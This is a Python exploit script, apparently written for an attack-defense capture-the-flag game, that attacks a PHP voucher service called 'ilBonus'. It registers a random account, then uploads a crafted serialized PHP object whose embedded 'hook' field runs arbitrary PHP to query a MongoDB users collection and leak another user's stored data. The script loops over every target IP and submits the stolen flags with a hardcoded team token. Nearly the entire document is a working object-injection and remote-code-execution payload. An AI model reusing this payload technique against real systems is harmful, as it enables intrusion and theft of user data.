#/usr/bin/python3

import requests, time, re, random, string

TEAM_TOKEN = '21d7214f2de4f6e743364e49196a346d'

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str



def exploit(json):
	lista = []
	c = 0
	for ip in json["ilBonus"]:
		c += 1
		size = len(json["ilBonus"])
		print(f"{c} / {size} ...")
		for username in json["ilBonus"][ip]:
			try:
				flag = get(ip, username)
				print(flag)
			except:
				print("ERR")
				continue
			if flag not in lista:
				lista.append(flag)
	return lista
	
def get(ip, username):
	session = requests.Session()
	reg_username = get_random_string(10) + "@gmail.com"
	reg_password = get_random_string(10)
	
	register(session, ip, reg_username, reg_password)
	login(session, ip, reg_username, reg_password)
	resp = richiedi(session, ip)
	oid_buono = resp[143:167]

	r = riscuoti(session, ip, oid_buono, username)
	flag = re.findall("[A-Z0-9]{31}=", r.text)[0]
	return flag
	
	

def register(session, ip, username, password):
	burp0_url = f"http://{ip}:8080/register"
	burp0_data = {"email": username, "password": password, "password_confirm": password}
	resp = session.post(burp0_url, data=burp0_data)
	return resp


def login(session, ip, username, password):
	burp0_url = f"http://{ip}:8080/login"
	burp0_data = {"email": username, "password": password}
	resp = session.post(burp0_url, data=burp0_data)
	return resp
	
def richiedi(session, ip):
    burp0_url = f"http://{ip}:8080/richiedi"
    burp0_data = {"categoria": "Computer", "descrizione": '', "negozio": '', "indirizzo": '', "infos": ''}
    resp = session.post(burp0_url, data=burp0_data)
    return resp.text
	
def riscuoti(session, ip, oid_buono, username):
    burp0_url = f"http://{ip}:8080/riscuoti"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------64052321125013213451568947986", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

    size = str(180+len(username))
    
    burp0_data = "-----------------------------64052321125013213451568947986\r\nContent-Disposition: form-data; name=\"voucherfile\"; filename=\"Voucher.vou\"\r\nContent-Type: application/octet-stream\r\n\r\nO:7:\"Voucher\":3:{s:7:\"voucher\";O:26:\"MongoDB\\Model\\BSONDocument\":4:{i:0;i:2;i:1;a:7:{s:3:\"_id\";O:21:\"MongoDB\\BSON\\ObjectId\":1:{s:3:\"oid\";s:24:\"" + oid_buono + "\";}s:9:\"categoria\";s:8:\"Computer\";s:11:\"descrizione\";s:0:\"\";s:7:\"negozio\";s:0:\"\";s:9:\"indirizzo\";s:0:\"\";s:5:\"infos\";s:0:\"\";s:6:\"utente\";s:11:\"xxx@xxx.com\";}i:2;a:0:{}i:3;N;}s:13:\"\x00Voucher\x00hmac\";b:1;s:13:\"\x00Voucher\x00hook\";s:" + size + ":\"global $users;$document = array('email' => \"" + username + "\");$cursor = $users->find($document);$it = new \\IteratorIterator($cursor);$it->rewind();$user = $it->current();echo($user->infos);die();\";}\r\n-----------------------------64052321125013213451568947986\r\nContent-Disposition: form-data; name=\"codicecassa\"\r\n\r\n\r\n-----------------------------64052321125013213451568947986\r\nContent-Disposition: form-data; name=\"numeroscontrino\"\r\n\r\n\r\n-----------------------------64052321125013213451568947986\r\nContent-Disposition: form-data; name=\"iban\"\r\n\r\n\r\n-----------------------------64052321125013213451568947986--\r\n"

    resp = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return resp

# get("10.60.0.1", "pBQojmWB@ilbonus.net")

while True:
	print("Running exploit...")
	json = requests.get("http://10.10.0.1:8081/flagIds").json()
	flags = exploit(json)
	print(flags)

	print("Putting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN},json=flags).text
	print(r)
	print("Exploit ok...\nRepeat...")
	print("\n")
